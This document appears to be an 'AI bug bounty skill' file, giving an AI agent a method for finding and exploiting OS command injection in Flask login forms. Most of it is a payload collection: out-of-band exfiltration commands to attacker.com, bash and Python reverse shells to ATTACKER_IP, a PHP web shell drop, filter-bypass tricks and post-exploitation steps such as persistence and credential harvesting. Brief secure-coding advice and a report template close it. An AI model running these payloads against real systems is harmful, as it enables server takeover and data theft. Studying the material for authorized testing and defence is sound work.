# 💻 Flask Login Form – Command Injection (OS Command Injection) – AI Bug Bounty Skill

## Skill Name
`flask-cmd-injection-login`

## Description
In-depth detection and exploitation of OS command injection vulnerabilities within Python Flask login forms. This skill analyses how user-controlled input (username, password, redirect URLs, or any login parameter) is passed to system commands – for instance, to validate credentials via external binaries, to perform system logging, or to handle file uploads during authentication. When the server constructs and executes shell commands without proper sanitisation, attackers can inject arbitrary commands, leading to full server compromise. The skill covers both blind and error-based injection, command chaining, filter bypasses, and post-exploitation actions.

## Affected Components
- **`os.system()` / `os.popen()` calls** using string formatting with user input:
  ```python
  user = request.form['username']
  os.system(f"echo {user} >> /var/log/login_attempts.log")
  ```
- **`subprocess.call()` / `subprocess.Popen()` with `shell=True`** and unsanitised input:
  ```python
  subprocess.call(f"verify_user.sh {username} {password}", shell=True)
  ```
- **Backtick syntax** (Python 2 legacy or rare): `` `cat /etc/passwd | grep {username}` ``
- **Template rendering that invokes commands** (e.g., custom Jinja2 filters that call `subprocess`).
- **Password complexity validation** that uses external tools (e.g., `cracklib` or custom binaries).
- **External authentication services** called via command line: `ldapsearch`, `smbclient`, `htpasswd`, `openssl`.
- **Log management** where log file names or content are passed to shell utilities like `tee`, `awk`, `sed`.
- **Redirect-after-login handling** if the `next` parameter is used in a shell command to perform page redirection (rare but possible with system-level HTTP tools).

## Detection Patterns (Static & Dynamic)
### 1. Direct Shell Command Construction
- **Heuristic**: Functions like `os.system()`, `os.popen()`, `subprocess.call(..., shell=True)` with user input inside an f-string, concatenation, or `%` formatting.
- **Dynamic test**: Inject a command separator like `;`, `|`, `&&`, or backticks and observe if the command executes. A typical probe is `; id` or `&& whoami` in the vulnerable parameter, checking the response for the output of the injected command (visible output or blind side effects).

### 2. Blind Command Injection
- The output of the command is not returned in the response but still executed.
- **Heuristic**: Same code patterns, but no direct output.
- **Dynamic test**: Use time‑based detection: `; sleep 5` or out‑of‑band callback: `; curl http://attacker.com/?c=$(id)` or `; wget http://attacker.com/$(hostname)`. If a delayed response or DNS/HTTP callback occurs, injection is confirmed.

### 3. Error-Based Identification
- Invalid commands may produce server errors (500) or Python tracebacks revealing the underlying OS call. Injecting a single quote `'` or backtick might break the shell command and cause an error.

### 4. Parameterised External Binary Usage
- The login flow might call `/usr/bin/verify_user -u <username> -p <password>`. Injecting `$(id)` or backticked commands in `username` can result in command substitution.

### 5. File-Based Command Injection
- If the username is used to construct a file path later executed (e.g., `source /etc/configs/{username}.cfg`), injection can occur via path traversal combined with command substitution.

## Testing Methodology (AI Agent Steps)
1. **Identify Potential Injection Points**
   - Login form fields: `username`, `password`, `email`, `token`, `next`, `redirect_uri`, and any hidden parameters.
   - Multi‑step login flows (e.g., second factor, challenge‑response).
   - Password reset endpoints that take a username and perform system actions.

2. **Probe for Command Execution Context**
   - Send a benign unique string and examine the response for any sign that the input was processed by an external command (e.g., echo in response, or the string appears in a system-generated error).
   - Inject characters that are special to the shell: `|`, `;`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>`.
   - Observe error messages: a `Syntax error` or `sh: 1: xxx: not found` directly indicates command injection.

3. **Test for Direct Output Injection**
   - Payload: `; id` or `| id`. If the server returns the current user ID (`uid=...`), injection is trivial.
   - Use `; ls -la` or `; cat /etc/passwd` if the output might be reflected in an error message.

4. **Blind Injection Detection**
   - **Time delay**: `; sleep 10` – measure response time.
   - **Out-of-band**:
     - `; curl http://your-collaborator/$(whoami)` (Linux)
     - `; nslookup $(hostname).your-collaborator` (DNS exfiltration)
     - `; powershell Invoke-WebRequest -Uri http://attacker.com/ -Body (hostname)` (Windows)
   - If a callback is received, the command executed.

5. **Bypass Filters and WAFs**
   - **Whitespace bypass**: Use `${IFS}` (Internal Field Separator) or `%09` (tab).
     - `;cat${IFS}/etc/passwd`
   - **Command separator alternatives**:
     - `%0a` (newline) works in some shells.
     - `%0d%0a` (CRLF) to inject commands in logs.
     - `||`, `|`, `&`, `&&`, `;` – try all.
   - **Character encoding**: URL encode special characters, double encode.
   - **Case variations**: `CMD`, `cmd`, `CmD` if the underlying command checks case.
   - **Quoting**: `c'a't /etc/passwd` (single quotes don't break word) or `c"a"t /etc/passwd`.
   - **Backslash tricks**: `c\a\t /etc/passwd`.
   - **Using `$()` instead of backticks** if backticks are filtered.
   - **Hex/octal conversion**: `$(printf '\x63\x61\x74') /etc/passwd`.

6. **Advanced Exploitation**
   - **Reverse shell**: `; bash -i >& /dev/tcp/attacker.com/4444 0>&1`
   - **Python reverse shell** (if the server has python installed):
     ```python
     ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
     ```
   - **Data exfiltration**: `; curl http://attacker.com/ -d "$(cat /etc/passwd)"`
   - **Web shell creation**: `; echo '<?php system($_GET["cmd"]);?>' > /var/www/html/shell.php` (if target is also serving PHP via another service, unlikely in pure Flask but possible in mixed environments).

## Essential Payloads (Flask Login Command Injection)
### Basic Probes
- `; id`
- `| id`
- `&& whoami`
- `%0aid` (newline injection)
- `` `id` ``

### Time-Based Blind
- `; sleep 10`
- `| ping -c 10 127.0.0.1`

### OOB (Out-of-Band) Detection
- `; curl http://attacker.com/?c=$(whoami)`
- `; wget http://attacker.com/$(hostname)`
- `; nslookup $(id).attacker.com`
- `; powershell IWR -Uri http://attacker.com/ -Body (hostname)` (Windows)

### Reverse Shell (Linux)
- `; bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"`
- `; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`

### Filter Bypasses
- `${IFS}` for space: `;cat${IFS}/etc/passwd`
- Tab (`%09`): `;cat%09/etc/passwd`
- Hex encoding: `;$(printf '\x63\x61\x74') /etc/passwd`
- Mixed quotes: `;c'a't /e't'c/pa's'swd`

## Post-Exploitation
- Full remote code execution with web server privileges.
- Lateral movement through internal network using the compromised server as pivot.
- Credential harvesting from environment variables or config files.
- Persistence via cron jobs, SSH keys, or backdoor scripts.

## Secure Coding Recommendations
- **Never pass user-supplied input directly to `os.system()`, `subprocess` with `shell=True`, or similar functions.** Use parameterised APIs.
- If external commands are necessary, use `subprocess.run()` with `shell=False` and pass arguments as a list:
  ```python
  subprocess.run(["/usr/bin/verify_user", username, password])
  ```
- **Implement strict input validation**: allow only expected characters (e.g., alphanumeric for username). Reject any input containing shell metacharacters.
- **Use `shlex.quote()`** to safely escape arguments if shell execution is unavoidable:
  ```python
  import shlex
  os.system(f"verify_user {shlex.quote(username)} {shlex.quote(password)}")
  ```
- **Apply least privilege**: run the Flask application with a non-root user that has minimal permissions.
- **Disable dangerous functions** in Python if not needed (though not a typical approach).
- **Use web application firewalls** to filter common injection patterns, but do not rely solely on them.

## Output Format (Bug Report)
```
Title: OS Command Injection in Login Form via Username Parameter
Severity: Critical (CVSS 10.0)
Endpoint: POST /login
Vulnerable Parameter: username
Description:
  The login endpoint passes the username to a shell command without sanitisation, allowing injection of arbitrary OS commands.
Proof of Concept:
  curl -X POST https://target.com/login -d "username=admin;id&password=test"
  Response includes uid=1000(webuser) gid=1000(webuser)...
Remediation: Use subprocess.run with a list of arguments (shell=False) and validate username input to alphanumeric characters only.
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with any OS command execution pattern
- **Testing Type**: Black-box / Grey-box (requires out-of-band server for blind injection)
- **Dependencies**: None; AI can craft injection payloads and interpret server behaviour.